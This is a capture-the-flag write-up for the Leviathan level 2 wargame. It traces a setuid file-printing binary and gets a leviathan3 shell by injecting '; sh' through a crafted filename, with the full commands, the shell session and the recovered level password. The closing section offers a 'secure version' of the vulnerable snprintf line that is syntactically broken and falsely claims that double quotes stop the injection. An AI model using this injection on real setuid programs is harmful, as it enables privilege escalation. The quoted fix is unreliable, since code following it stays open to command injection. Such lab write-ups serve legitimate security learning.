## Level2: leviathan2

Objective: Find the password to enter level3 **leviathan3**.

### This is how I found it:

1. This level was just amazing, because it dealt with a  very interesting vulnerability, which took a while for me to identify.

2. It is clear that, we have to get higher privileges to get the flag which is present in **/etc/leviathan_pass/leviathan3** .

3. The **printfile** executable is setuid to **leviathan3**. If we are able to get a shell from it or atleast execute arbitrary commands through it, we can get the password.

4. Now, let us focus on how **printfile** works.
			
		leviathan2@leviathan:~$ ./printfile 
		*** File Printer ***
		Usage: ./printfile filename
		leviathan2@leviathan:~$ 


* So, it is expecting a **filename**. Let us give some name and see what happens. Let us give **qwerty**. 
			
		leviathan2@leviathan:~$ ./printfile qwerty
		You cant have that file...
		leviathan2@leviathan:~$ 

* We can see that the filename is processed / checked in some manner and gives the above output. Let us get into the detail of how it checks a given filename.
		
		leviathan2@leviathan:~$ ltrace ./printfile qwerty
		__libc_start_main(0x565556c0, 2, 0xffffd734, 0x565557b0 <unfinished ...>
		access("qwerty", 4)                                              = -1
		puts("You cant have that file..."You cant have that file...
		)                               = 27
		+++ exited (status 1) +++
		leviathan2@leviathan:~$ 

* First, the **access()** function is used to check the **readability** of the file. The value **4** stands for **R_OK**. If the **file is present** and **it can be read by the user** . The below lines are from **sys/unistd.h** .

		/* Values for the second argument to access.
		  These may be OR'd together.  */
		#define	R_OK	4		/* Test for read permission.  */
		#define	W_OK	2		/* Test for write permission.  */
		#define	X_OK	1		/* Test for execute permission.  */
		#define	F_OK	0		/* Test for existence.  */

* We want to read the contents of **/etc/leviathan_pass/leviathan3**. So, let us give that filename and run **printfile**.
			
		leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
		You cant have that file...
		leviathan2@leviathan:~$ 

	Oh!, this was unexpected. Have a look at this.
		
		leviathan2@leviathan:~$ id
		uid=12002(leviathan2) gid=12002(leviathan2) groups=12002(leviathan2)
		leviathan2@leviathan:~$ 
		leviathan2@leviathan:~$ ls -l printfile
		-r-sr-x--- 1 leviathan3 leviathan2 7640 May 10 18:27 printfile
		leviathan2@leviathan:~$ 

* This is surprising right! The **printfile** is setuid to **leviathan3**. So, when it is run, the **effective user** will be **leviathan3**. You might think that as the effective user is leviathan3, and leviathan3 is also the owner of **/etc/leviathan_pass/leviathan3**, we should be able to get the flag directly. But this is not happening. There is a very important reason behind it.
	
	* The **access()** function  checks the **read permissions** of the file of the **original / real user / uid**, that is, the user who runs **printfile**, than the **effective user**. access() is programmed in this manner for security reasons. 
	
	* When **access("/etc/leviathan_pass/leviathan3", 4)** is executed, it checks if **leviathan2**(the user who is executing the program) has read permissions rather than checking if **leviathan3**(the effective user + actual owner of the program). As leviathan2 does not have read permissions for this file, we don't get the flag. 
	
	* Also it first checks if the file exists. Only if it exists, it checks for read permissions.
	
* I understood that the question is not as straight forward as I thought it was. 
* We can create file only in the **/tmp** directory. So, let us do all the further experiments in  **/tmp** directory.

* Suppose I create a file **/tmp/qwerty**, let us see what happens.
			
		leviathan2@leviathan:~$ cd /tmp
		leviathan2@leviathan:/tmp$ touch qwerty
		leviathan2@leviathan:/tmp$ echo "I am inside qwerty file" > qwerty
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ ./printfile qwerty
		I am inside qwerty file
		leviathan2@leviathan:/tmp$ ltrace ./printfile qwerty
		__libc_start_main(0x565556c0, 2, 0xffffd724, 0x565557b0 <unfinished ...>
		access("qwerty", 4)                                              = 0
		snprintf("/bin/cat qwerty", 511, "/bin/cat %s", "qwerty")        = 15
		geteuid()                                                        = 12002
		geteuid()                                                        = 12002
		setreuid(12002, 12002)                                           = 0
		system("/bin/cat qwerty"I am inside qwerty file
		 <no return ...>
		--- SIGCHLD (Child exited) ---
		<... system resumed> )                                           = 0
		+++ exited (status 0) +++
		leviathan2@leviathan:/tmp$ 

* This gives complete clarity of what the program is  doing. 
	
	* **access()** is checking if the **real user**(here **leviathan2**) has read permissions to **qwerty**(or any other file we enter). If it returns **0**, then leviathan2 has read permissions. Here, leviathan2 has read permissions to **/tmp/qwerty**. 
	
	* **snprintf("/bin/cat qwerty", 511, "/bin/cat %s", "qwerty")**	: A string is generated in this manner: str = **/bin/cat %s**. 
	
	* Simple working:  **system(str)** is executed. If the real user can read the file entered, it's contents are printed. If not, it just prints **You cant have that file...** .

* Or, **is it that simple**, we will try a few more things.

* Consider the following: 

		leviathan2@leviathan:/tmp$ touch f1
		leviathan2@leviathan:/tmp$ echo "This is f1" > f1
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ touch f2
		leviathan2@leviathan:/tmp$ echo "This is f2" > f2
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ touch "f1 f2"
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ echo "This is f1 f2" > "f1 f2"
		leviathan2@leviathan:/tmp$ 

	* There are 3 file created: **f1**, **f2** and (**"f1 f2"** or **f1\ f2**). Each have a sentence in them, which will help our experiment.
	
	* Use **printfile** and read contents of all the 3 files.   
	
			leviathan2@leviathan:/tmp$ ~/printfile f1
			This is f1
			leviathan2@leviathan:/tmp$ 
			leviathan2@leviathan:/tmp$ ~/printfile f2
			This is f2
			leviathan2@leviathan:/tmp$ 
			leviathan2@leviathan:/tmp$ ~/printfile "f1 f2"
			This is f1
			This is f2
			leviathan2@leviathan:/tmp$ 
	
	* Did you just observe what happened?! Instead of printing **This is f1 f2**, Contents of files **f1** and **f2** got printed. Let us see why we got this strange result. 
		
	* The **/bin/cat** tool works in the following manner. 
			
			$ /bin/cat f1 f2
			
		is the same as 
			
			$ /bin/cat f1 ; /bin/cat f2
	
	* If there are n arguments, All of them are dealt with independently. 
	* If we want to get the contents of "f1 f2", then
	
			$ /bin/cat f1\ f2
			
		or 
	
			$ /bin/cat "f1 f2"
	
	* Check this out:
	
			leviathan2@leviathan:/tmp$ cat f1
			This is f1
			leviathan2@leviathan:/tmp$ cat f2
			This is f2
			leviathan2@leviathan:/tmp$ cat f1 f2
			This is f1
			This is f2
			leviathan2@leviathan:/tmp$ cat "f1 f2"
			This is f1 f2
			leviathan2@leviathan:/tmp$ cat f1\ f2
			This is f1 f2
			leviathan2@leviathan:/tmp$ 

* Coming back the question:
	* **access()** checks permissions for **f1\ f2**, but **/bin/cat** is opening 2 entirely different files. 
	* Ideally, the **one file** whose permissions are checked should be opened by /bin/cat. But here, 2 different files are getting opened. 
	* This opening of 2 files is something that was **not intended** of the program. So, This is definitely a **bug**. Let us see if this is a **vulnerability** . 

* Let us see how it can be exploited to get the password.

* Observe this carefully:

		$ cat f1; echo "This is the trick"

	* The above is a very common trick, if you want 2 commands to be executed one after the other, use a **;** . First **cat f1** is executed, and then **echo** is executed. 

* system(str) : 
	
	* str = "/bin/cat %s"
	
	* Suppose I give %s = **f1; echo "This is the trick"** , then str = **"/bin/cat f1; echo "This is the trick"**. So, as we saw above, first **/bin/cat f1** gets executed, and then **echo** . 
	
	* Here, the **echo** command represents **any** arbitrary command right? We can give any command instead of echo and it peacefully gets executed. 
	
	* Now, I will be able to execute any command, with higher privileges(here, privileges of **leviathan3**).  
	
* Obviously, if we are able to execute any command, then I would execute **/bin/sh** first and get a shell. Then, I can do whatever I want with that.

* Look at the exploit: 

		leviathan2@leviathan:/tmp$ id
		uid=12002(leviathan2) gid=12002(leviathan2) groups=12002(leviathan2)
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ touch f1
		leviathan2@leviathan:/tmp$ echo "This is f1" > f1
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ touch "f1; sh"
		leviathan2@leviathan:/tmp$   
		leviathan2@leviathan:/tmp$ ~/printfile "f1; sh"
		This is f1
		$ 
		$ 
		$ id
		uid=12003(leviathan3) gid=12002(leviathan2) groups=12002(leviathan2)
		$ 
		$ whoami
		leviathan3
		$ 
		$ cat /etc/leviathan_pass/leviathan3
		Ahdiemoo1j
		$ 
		
* **GAME OVER!**

### Password for leviathan3: Ahdiemoo1j

-----------------------
**PS**: 

1. In general, the exploit can be like this:

		leviathan2@leviathan:/tmp$ touch "somefile; sh"
		leviathan2@leviathan:/tmp$ 
		leviathan2@leviathan:/tmp$ ~/printfile "somefile; sh"
		/bin/cat: somefile: No such file or directory
		$ 
		$ id
		uid=12003(leviathan3) gid=12002(leviathan2) groups=12002(leviathan2)
		$ 
		$ whoami
		leviathan3
		$ 

* You don't have to create the **f1** file I created. Because, if that file is not there, then **/bin/cat** will fail, which does not hurt the exploit. 

* But, we have to care about this. There has to be a file named **somefile; sh**, because it's presence will be checked by **access()**. If this file is not present, then simply executing **~/printfile "somefile; sh"** wont work, because it will just stop after access()  returns a **-1** because no such file exists. 

2. When I saw the **ltrace** output, I thought that question is crafted just to read **/etc/leviathan_pass/leviathan3** and get the password. But this turned out to be a proper **arbitrary code execution vulnerability**. Let us see why this vulnerability is  present. In this program, the **snprintf** was not written in right manner. 
	
	* This is how it is present in this program(**vulnerable version**) :
		
			snprintf(str, 511, "/bin/cat %s", some_string);
	
	* But, it should have been like this:(**secure version**) :
	
			snprintf(str,511, "/bin/cat \"%s\", some_string);

	* Suppose some_string = "somefile; sh" .
	
	* The vulnerable version generates str = **/bin/cat somefile; sh** , and we know how it is executed. 
	
	* The secure version generates str =  **/bin/cat "somefile; sh"**	: This way, the the vulnerability is patched. 

* Look at the difference between the vulnerable and the secure versions. There is hardly any difference - just a pair of double quotes . It is very easy to overlook the double quotes while coding, thereby creating such a wonderful (:P) security vulnerability in the whole software. 

3. To see exactly how **access()** works, refer the manpage : `$ man access` and it explains stuff about access() in a very detailed manner.


	
			


